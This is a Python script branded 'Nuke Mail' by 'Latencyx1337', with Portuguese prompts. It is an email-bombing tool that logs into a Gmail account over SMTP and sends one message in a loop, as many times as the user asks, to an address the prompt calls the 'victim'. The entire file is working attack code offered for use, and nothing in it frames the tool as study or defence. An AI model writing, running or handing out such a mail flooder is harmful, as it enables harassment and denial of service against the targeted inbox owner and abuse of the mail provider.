import os, sys, smtplib, getpass, config, ctypes, base64

try:

    W = '\033[0m'  #White
    R = '\033[31m' #Red
    G = '\033[32m' #Green

    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("Nuke Mail | by Latencyx1337")
    print(R + "        _   __      __           __  ___      _ __");
    print(R + "       / | / /_  __/ /_____     /  |/  /___ _(_) /");
    print(R + "      /  |/ / / / / //_/ _ \   / /|_/ / __ `/ / / ");
    print(R + "     / /|  / /_/ / ,< /  __/  / /  / / /_/ / / /  ");
    print(R + "    /_/ |_/\__,_/_/|_|\___/  /_/  /_/\__,_/_/_/   ");
    print(W + "                   by Latencyx1337\n                                             ");

    smtp_server= 'smtp.gmail.com'
    port = 587
    set_server = "gmail"
    email_user = config.EMAIL
    passwd     = config.SENHA
    splitadok  = email_user.split("@");
    gmailla    = splitadok[1];
    tstart     = len(gmailla);
    print("Email logado: " +  splitadok[0] + "@" + "*" * tstart);
    email_to   = input('\nVítima: ')
    subject    = input('Título do envio: ')
    body       = input('Mensagem que você quer passar: ')
    total      = input('Quantidade: ')
    int_body   = int(total)
    try:

        server = smtplib.SMTP(smtp_server,port) 
        server.ehlo()

        if set_server == "gmail":
            server.starttls()

        server.login(email_user,passwd)

        print(R + "\n\n\n Alvo: {} -\n".format(email_to))


        for i in range(1, int_body+1):

            msg = 'From: ' + email_user + '\nSubject: ' + subject + '\n' + body

            server.sendmail(email_user,email_to,msg)
            print(G + "\r[INFO] {}".format(i))

            sys.stdout.flush()

        server.quit()

        print( R + "\n\nAll {} sent".format(i) + W)

    except KeyboardInterrupt:

        print(R + "\nError - Keyboard Interrupt" + W)
        sys.exit()

    except smtplib.SMTPAuthenticationError:

        print( R + "\nMude o email na source." + W)
        sys.exit()

except smtplib.SMTPAuthenticationError:

    sys.exit()
